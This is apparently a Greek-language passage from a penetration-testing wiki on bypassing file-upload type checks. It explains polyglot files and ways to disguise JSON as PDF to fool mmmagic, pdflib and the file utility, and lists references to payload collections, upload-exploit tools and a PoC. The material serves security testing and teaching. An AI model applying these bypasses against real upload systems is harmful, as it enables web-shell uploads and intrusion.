Η βασική χρησιμότητα των polyglot αρχείων έγκειται στην ικανότητά τους να παρακάμπτουν μέτρα ασφαλείας που ελέγχουν τα αρχεία βάσει τύπου. Κοινή πρακτική σε διάφορες εφαρμογές είναι να επιτρέπονται μόνο συγκεκριμένοι τύποι αρχείων για upload — όπως JPEG, GIF ή DOC — για να μειωθεί ο κίνδυνος από ενδεχόμενα επικίνδυνα formats (π.χ. JS, PHP, ή Phar αρχεία). Ωστόσο, ένα polyglot, συμμορφούμενο με τις δομικές απαιτήσεις πολλαπλών τύπων αρχείων, μπορεί να παρακάμψει αυτές τις περιοριστικές πολιτικές.

Παρά την προσαρμοστικότητά τους, τα polyglots αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να ενσωματώνει ένα PHAR file (PHp ARchive) και ένα JPEG, η επιτυχία του upload μπορεί να εξαρτάται από τις πολιτικές επέκτασης αρχείων της πλατφόρμας. Εάν το σύστημα είναι αυστηρό όσον αφορά τις επιτρεπτές επεκτάσεις, η απλή δομική διπλότητα ενός polyglot μπορεί να μην αρκεί για να εξασφαλίσει το upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Πώς να αποφύγετε τον εντοπισμό τύπου αρχείου ανεβάζοντας ένα έγκυρο JSON ακόμα κι αν δεν επιτρέπεται, μιμούμενοι ένα PDF (τεχνικές από **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Εφόσον τα magic bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes είναι έγκυρο (βλέπε παράδειγμα από το post)
- **`pdflib` library**: Προσθέστε ένα ψεύτικο PDF format μέσα σε ένα πεδίο του JSON ώστε η βιβλιοθήκη να νομίζει ότι είναι PDF (βλέπε παράδειγμα από το post)
- **`file` binary**: Μπορεί να διαβάσει έως 1048576 bytes από ένα αρχείο. Δημιουργήστε απλά ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να το αναλύσει ως JSON και στη συνέχεια μέσα στο JSON βάλτε το αρχικό μέρος ενός πραγματικού PDF και θα νομίσει ότι είναι PDF

## Αναφορές

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
